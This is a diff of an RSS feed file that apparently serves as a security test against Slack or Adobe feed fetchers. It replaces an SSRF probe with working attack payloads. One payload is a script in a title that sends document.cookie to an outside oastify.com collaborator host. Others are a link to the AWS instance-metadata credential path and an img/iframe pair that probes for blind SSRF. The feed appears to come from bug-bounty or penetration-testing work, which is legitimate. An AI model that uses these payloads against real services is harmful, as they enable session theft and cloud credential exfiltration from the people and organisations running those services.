@@ -1,24 +1,11 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>SSRF Testing via Collaborator</title>
-    <link>http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/main_link</link>
-    <description>Testing if Slack server will reach out to our collaborator</description>
-    
-    <atom:link href="http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/atom_link" rel="self" type="application/rss+xml" />
-
-    <item>
-      <title>Full SSRF Payload</title>
-      
-      <link>http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/item_link</link>
-      
-      <description>
-        Check the collaborator for incoming requests from Slack/Adobe infrastructure.
-      </description>
-      
-      <guid isPermaLink="true">http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/guid_link</guid>
-      
-      <comments>http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/comments</comments>
-    </item>
-  </channel>
-</rss>
+<title>&lt;script&gt;fetch('http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/xss?c='+document.cookie)&lt;/script&gt;</title>
+<item>
+    <title>Urgent Security Update</title>
+    <link>http://169.254.169.254/latest/meta-data/iam/security-credentials/</link>
+    <description>
+        <![CDATA[
+        <img src="http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/blind_ssrf_img">
+        Check this: <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+        ]]>
+    </description>
+</item>
